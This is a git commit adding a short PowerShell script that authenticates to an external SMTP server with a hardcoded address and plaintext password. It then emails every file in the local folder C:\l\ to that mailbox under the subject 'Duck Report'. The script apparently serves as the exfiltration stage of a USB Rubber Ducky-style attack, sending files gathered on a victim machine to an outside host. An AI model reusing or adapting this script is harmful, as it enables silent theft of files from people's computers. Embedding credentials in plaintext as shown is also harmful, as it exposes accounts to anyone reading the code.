a430f0b2fb78afae9ac6b9434630f149a88e3af7
ZaczykLukasz <48690055+ZaczykLukasz@users.noreply.github.com>
2019-11-29 09:49:15 +0100

    Add files via upload

---
+++ email.ps1
@@ -0,0 +1,18 @@
+$SMTPServer = 'smtp.wp.pl'
+$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 465)
+$SMTPInfo.EnableSsl = $true
+$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('emaildotestowania1@wp.pl', 'Lukasz123');
+$ReportEmail = New-Object System.Net.Mail.MailMessage
+$ReportEmail.From = 'emaildotestowania1@wp.pl'
+$ReportEmail.To.Add('emaildotestowania1@wp.pl')
+$ReportEmail.Subject = 'Duck Report'
+$ReportEmail.Body = 'Attached is your duck report.... Quack' 
+$files=Get-ChildItem "C:\l\"
+Foreach($file in $files)
+{
+
+$attachment = New-Object System.Net.Mail.Attachment –ArgumentList C:\l\$file
+$ReportEmail.Attachments.Add($attachment)
+$SMTPInfo.Send($ReportEmail)
+}
+write-host "Mail Sent Successfully"
